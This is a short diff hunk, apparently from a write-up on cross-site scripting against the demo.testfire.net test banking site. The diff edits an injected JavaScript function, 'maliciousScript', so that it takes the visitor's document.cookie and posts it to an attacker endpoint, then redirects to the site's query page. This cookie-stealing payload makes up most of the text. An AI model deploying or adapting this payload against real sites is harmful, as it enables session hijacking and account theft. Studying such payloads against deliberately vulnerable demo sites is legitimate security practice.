@@ -52,9 +52,10 @@ I wasn't able to inject the below code section within the URL due to the charact
 <script>
 function maliciousScript() {
 	var val = document.getElementById("query").value;
+  var cookieData = document.cookie;
 	$.post("maliciousServerEndpoint",
 	  {
-		"feedbackText": val
+		"userCookie": cookieData
 	  });
 	 window.location = "http://demo.testfire.net/bank/queryxpath.jsp?query=" + val;
 }
